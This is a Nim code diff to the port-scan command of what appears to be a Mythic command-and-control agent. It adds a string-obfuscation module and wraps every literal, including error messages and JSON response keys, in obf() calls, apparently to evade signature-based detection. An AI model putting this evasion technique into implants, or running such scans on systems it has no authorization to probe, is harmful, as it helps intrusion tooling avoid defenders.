@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strutils, sequtils, net, strformat, os, tables]
 
 when defined(windows):
@@ -93,13 +94,13 @@ proc portscan*(taskId: string, params: JsonNode): JsonNode =
     let args = to(params, PortScanArgs)
     
     if args.hosts.len == 0:
-      return mythicError(taskId, "No hosts specified")
+      return mythicError(taskId, obf("No hosts specified"))
     
     if args.ports.len == 0:
-      return mythicError(taskId, "No ports specified")
+      return mythicError(taskId, obf("No ports specified"))
     
     if portscanActive:
-      return mythicError(taskId, "A port scan is already running")
+      return mythicError(taskId, obf("A port scan is already running"))
     
     # Expand hosts (handle CIDR)
     var allHosts: seq[string] = @[]
@@ -109,7 +110,7 @@ proc portscan*(taskId: string, params: JsonNode): JsonNode =
     # Expand ports (handle ranges)
     let allPorts = expandPortRange(args.ports)
     if allPorts.len == 0:
-      return mythicError(taskId, "No valid ports specified")
+      return mythicError(taskId, obf("No valid ports specified"))
     
     debug &"[DEBUG] Port scan: {allHosts.len} hosts, {allPorts.len} ports (non-blocking)"
     debug &"[DEBUG] Interval: {args.interval}ms"
@@ -123,22 +124,22 @@ proc portscan*(taskId: string, params: JsonNode): JsonNode =
       currentPortIndex: 0,
       openPorts: @[],
       totalScanned: 0,
-      output: &"Scanning {allHosts.len} host(s) for {allPorts.len} port(s)...\n\n"
+      output: &"\n" & obf("Scanning ") & $allHosts.len & obf(" host(s) for ") & $allPorts.len & obf(" port(s)...\n\n")
     )
     
     portscanActive = true
     
     # Return processing status - agent will poll checkPortscan
-    let msg = "Port scan started for " & $allHosts.len & " host(s), " & $allPorts.len & " port(s) (background task)"
+    let msg = obf("Port scan started for ") & $allHosts.len & obf(" host(s), ") & $allPorts.len & obf(" port(s) (background task)")
     return %*{
-      "task_id": taskId,
-      "completed": false,
-      "status": "processing",
-      "user_output": msg
+      obf("task_id"): taskId,
+      obf("completed"): false,
+      obf("status"): obf("processing"),
+      obf("user_output"): msg
     }
     
   except Exception as e:
-    return mythicError(taskId, "Port scan error: " & e.msg)
+    return mythicError(taskId, obf("Port scan error: ") & e.msg)
 
 proc checkPortscan*(taskId: string): JsonNode =
   ## Check port scan progress and scan some ports (incremental scanning)
@@ -167,7 +168,7 @@ proc checkPortscan*(taskId: string): JsonNode =
       
       if isOpen:
         portscanState.openPorts.add((host: host, port: port))
-        let output = &"\n[+] {host}:{port} OPEN\n"
+        let output = &"\n" & obf("[+] ") & host & ":" & $port & obf(" OPEN\n")
         
         debug &"[DEBUG] {host}:{port} OPEN"
         
@@ -181,10 +182,10 @@ proc checkPortscan*(taskId: string): JsonNode =
           portscanState.currentHostIndex.inc()
         
         return %*{
-          "task_id": taskId,
-          "completed": false,
-          "status": "processing",
-          "user_output": output
+          obf("task_id"): taskId,
+          obf("completed"): false,
+          obf("status"): obf("processing"),
+          obf("user_output"): output
         }
       
       portscanState.currentPortIndex.inc()
@@ -203,7 +204,7 @@ proc checkPortscan*(taskId: string): JsonNode =
     if not portscanActive or portscanState.currentHostIndex >= portscanState.allHosts.len:
       portscanActive = false
       
-      let finalOutput = &"\nPort scan complete: {portscanState.openPorts.len} open port(s) found out of {portscanState.totalScanned} ports scanned across {portscanState.allHosts.len} host(s)"
+      let finalOutput = &"\n" & obf("Port scan complete: ") & $portscanState.openPorts.len & obf(" open port(s) found out of ") & $portscanState.totalScanned & obf(" ports scanned across ") & $portscanState.allHosts.len & obf(" host(s)")
       
       debug "[DEBUG] Port scan completed"
       
@@ -213,4 +214,4 @@ proc checkPortscan*(taskId: string): JsonNode =
     
   except Exception as e:
     portscanActive = false
-    return mythicError(taskId, "Port scan error: " & e.msg)
+    return mythicError(taskId, obf("Port scan error: ") & e.msg)
